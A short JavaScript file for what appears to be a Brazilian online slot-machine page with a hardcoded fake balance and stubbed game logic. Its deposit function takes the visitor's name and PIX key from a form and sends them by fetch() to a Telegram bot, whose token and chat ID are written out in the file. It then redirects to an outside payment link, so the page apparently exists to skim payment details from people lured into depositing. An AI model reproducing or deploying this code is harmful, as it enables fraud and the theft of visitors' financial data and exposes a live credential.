const TELEGRAM_TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const TELEGRAM_CHAT_ID = "6238676644";

let saldoAtual = 388.00;
let valorAposta = 2.00;

window.girarSlots = function() {
    if (saldoAtual < valorAposta) {
        alert("Saldo insuficiente!");
        return;
    }
    saldoAtual -= valorAposta;
    document.getElementById("saldo").innerText = `R$ ${saldoAtual.toFixed(2).replace('.', ',')}`;
    // ... restante da lógica de sorteio original ...
};

window.salvarEDepositarPIX = function() {
    const nome = document.getElementById("pix-nome").value;
    const chave = document.getElementById("pix-chave").value;
    
    // Envio para Telegram (Mantido como estava)
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `Depósito: ${nome} - ${chave}` })
    }).then(() => {
        window.location.href = "https://go.tribopay.com.br/w3p787fphj";
    });
};

window.abrirModalDeposito = () => document.getElementById("modal-deposito").style.display = "flex";
window.fecharModalDeposito = () => document.getElementById("modal-deposito").style.display = "none";
